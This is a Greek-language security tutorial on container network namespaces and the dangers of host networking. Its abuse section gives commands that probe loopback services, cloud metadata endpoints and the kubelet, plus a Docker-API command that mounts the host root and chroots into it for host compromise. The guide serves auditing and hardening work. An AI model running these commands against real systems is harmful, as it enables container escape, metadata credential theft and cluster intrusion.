# Χώρος Ονομάτων Δικτύου

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ο χώρος ονομάτων δικτύου απομονώνει πόρους σχετικούς με το δίκτυο, όπως διεπαφές, διευθύνσεις IP, πίνακες δρομολόγησης, κατάσταση ARP/neighbor, κανόνες firewall, sockets και τα περιεχόμενα αρχείων όπως `/proc/net`. Γι' αυτό ένα container μπορεί να έχει αυτό που μοιάζει με δικό του `eth0`, τους δικούς του τοπικούς δρομους, και τη δική του συσκευή loopback χωρίς να κατέχει το πραγματικό network stack του host.

Από άποψη ασφάλειας, αυτό έχει σημασία γιατί η απομόνωση δικτύου αφορά πολύ περισσότερα από το port binding. Ένας ιδιωτικός χώρος ονομάτων δικτύου περιορίζει τι μπορεί το workload να παρατηρήσει ή να αναδιαμορφώσει άμεσα. Μόλις αυτός ο χώρος ονομάτων κοινοποιηθεί με το host, το container μπορεί ξαφνικά να αποκτήσει ορατότητα σε host listeners, host-local services και σημεία ελέγχου δικτύου που δεν προορίζονταν για αποκάλυψη στην εφαρμογή.

## Λειτουργία

Ένας πρόσφατα δημιουργημένος χώρος ονομάτων δικτύου ξεκινά με ένα κενό ή σχεδόν κενό περιβάλλον δικτύου μέχρι να προσαρτηθούν διεπαφές. Τα container runtimes στη συνέχεια δημιουργούν ή συνδέουν virtual interfaces, εκχωρούν διευθύνσεις και ρυθμίζουν routes ώστε το workload να έχει την αναμενόμενη συνδεσιμότητα. Σε bridge-based deployments, αυτό συνήθως σημαίνει ότι το container βλέπει μια veth-backed διεπαφή συνδεδεμένη σε host bridge. Στο Kubernetes, τα CNI plugins χειρίζονται την αντίστοιχη ρύθμιση για Pod networking.

Αυτή η αρχιτεκτονική εξηγεί γιατί το `--network=host` ή `hostNetwork: true` αποτελεί τόσο δραματική αλλαγή. Αντί να λαμβάνει ένα προετοιμασμένο ιδιωτικό network stack, το workload εντάσσεται στο πραγματικό του host.

## Εργαστήριο

Μπορείτε να δείτε έναν σχεδόν κενό χώρο ονομάτων δικτύου με:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Και μπορείτε να συγκρίνετε τα κανονικά containers με τα host-networked containers με:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Το container με host networking δεν έχει πλέον τη δική του απομονωμένη προβολή sockets και διεπαφών. Αυτή η αλλαγή μόνη της είναι σημαντική ακόμα και πριν ρωτήσεις ποιες capabilities έχει η διεργασία.

## Χρήση κατά την εκτέλεση

Docker και Podman συνήθως δημιουργούν ένα ιδιωτικό network namespace για κάθε container εκτός αν διαμορφωθούν διαφορετικά. Kubernetes συνήθως δίνει σε κάθε Pod το δικό του network namespace, που μοιράζεται από τα containers μέσα στο Pod αλλά είναι ξεχωριστό από τον host. Incus/LXC systems παρέχουν επίσης πλούσια απομόνωση βασισμένη σε network namespaces, συχνά με μεγαλύτερη ποικιλία ρυθμίσεων virtual networking.

Η γενική αρχή είναι ότι το private networking είναι το προεπιλεγμένο όριο απομόνωσης, ενώ το host networking είναι ρητή επιλογή εξόδου από αυτό το όριο.

## Λανθασμένες διαμορφώσεις

Η πιο σημαντική λανθασμένη διαμόρφωση είναι απλώς η κοινή χρήση του host network namespace. Αυτό γίνεται κάποιες φορές για λόγους απόδοσης, low-level monitoring, ή ευκολίας, αλλά αφαιρεί ένα από τα καθαρότερα όρια που είναι διαθέσιμα στα containers. Οι host-local listeners γίνονται προσβάσιμοι με πιο άμεσο τρόπο, localhost-only services ενδέχεται να γίνουν προσβάσιμες, και capabilities όπως `CAP_NET_ADMIN` ή `CAP_NET_RAW` γίνονται πολύ πιο επικίνδυνες επειδή οι ενέργειες που επιτρέπουν εφαρμόζονται πλέον στο ίδιο το network περιβάλλον του host.

Ένα ακόμα πρόβλημα είναι η υπέρμετρη παροχή network-related capabilities ακόμα και όταν το network namespace είναι ιδιωτικό. Ένα ιδιωτικό namespace βοηθάει, αλλά δεν καθιστά τα raw sockets ή τον προηγμένο έλεγχο δικτύου ακίνδυνα.

## Κατάχρηση

Σε αδυναμώς απομονωμένα setups, επιτιθέμενοι μπορεί να εξετάσουν υπηρεσίες που ακούνε στον host, να προσεγγίσουν management endpoints δεσμευμένα μόνο στο loopback, να sniff-άρουν ή να παρεμβληθούν στην κίνηση ανάλογα με τα ακριβή capabilities και το περιβάλλον, ή να αναδιαμορφώσουν το routing και την κατάσταση του firewall εάν υπάρχει το `CAP_NET_ADMIN`. Σε ένα cluster, αυτό μπορεί επίσης να διευκολύνει lateral movement και control-plane reconnaissance.

Αν υποψιάζεσαι host networking, ξεκίνα επιβεβαιώνοντας ότι οι ορατές διεπαφές και οι listeners ανήκουν στον host και όχι σε ένα απομονωμένο container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Οι loopback-only υπηρεσίες είναι συχνά η πρώτη ενδιαφέρουσα ανακάλυψη:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Εάν υπάρχουν δικτυακές δυνατότητες, ελέγξτε εάν το workload μπορεί να επιθεωρήσει ή να τροποποιήσει το ορατό stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Σε περιβάλλοντα cluster ή cloud, το host networking δικαιολογεί επίσης γρήγορο local recon του metadata και των υπηρεσιών που βρίσκονται κοντά στο control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Πλήρες Παράδειγμα: Host Networking + Local Runtime / Kubelet Access

Το host networking δεν παρέχει αυτόματα root του host, αλλά συχνά εκθέτει υπηρεσίες που είναι σκόπιμα προσβάσιμες μόνο από τον ίδιο τον κόμβο. Εάν μία από αυτές τις υπηρεσίες είναι αδύναμα προστατευμένη, το host networking γίνεται απευθείας privilege-escalation path.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet στο localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- άμεση παραβίαση του host εάν ένα τοπικό runtime API είναι εκτεθειμένο χωρίς κατάλληλη προστασία
- cluster reconnaissance ή lateral movement εάν το kubelet ή τοπικοί agents είναι προσβάσιμοι
- χειραγώγηση της κυκλοφορίας ή denial of service όταν συνδυάζεται με `CAP_NET_ADMIN`

## Checks

Ο στόχος αυτών των ελέγχων είναι να διαπιστωθεί εάν η διεργασία διαθέτει ιδιωτικό network stack, ποιες routes και listeners είναι ορατές, και αν η όψη του δικτύου ήδη μοιάζει με host πριν καν δοκιμάσετε τις capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Αν ο αναγνωριστής του namespace ή το ορατό σύνολο διεπαφών μοιάζει με αυτό του host, ενδέχεται να χρησιμοποιείται ήδη host networking.
- `ss -lntup` είναι ιδιαίτερα χρήσιμο γιατί αποκαλύπτει ακροατές που είναι προσβάσιμοι μόνο από το loopback και τοπικά management endpoints.
- Οι routes, τα ονόματα διεπαφών και το πλαίσιο του firewall γίνονται πολύ πιο σημαντικά αν υπάρχει `CAP_NET_ADMIN` ή `CAP_NET_RAW`.

Όταν εξετάζετε ένα container, αξιολογήστε πάντα το network namespace μαζί με το σύνολο δυνατοτήτων. Host networking μαζί με ισχυρές δικτυακές δυνατότητες αποτελεί πολύ διαφορετική κατάσταση σε σχέση με bridge networking μαζί με ένα στενό προεπιλεγμένο σύνολο δυνατοτήτων.
